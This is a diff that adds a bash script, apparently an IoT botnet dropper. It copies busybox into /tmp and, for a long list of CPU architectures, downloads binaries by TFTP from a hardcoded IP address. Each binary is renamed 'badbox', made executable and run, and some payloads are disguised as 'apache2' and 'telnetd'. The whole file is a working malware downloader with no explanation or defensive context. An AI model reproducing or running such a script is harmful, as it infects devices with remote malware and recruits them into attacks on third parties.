@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohomips;cat hohomips >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohomipsel;cat hohomipsel >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohosh4;cat hohosh4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohox86;cat hohox86 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohoarm6;cat hohoarm6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hoho686;cat hoho686 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohoppc;cat hohoppc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hoho586;cat hoho586 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohom68k;cat hohom68k >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get hohosh;cat hohosh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.95.43.182 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
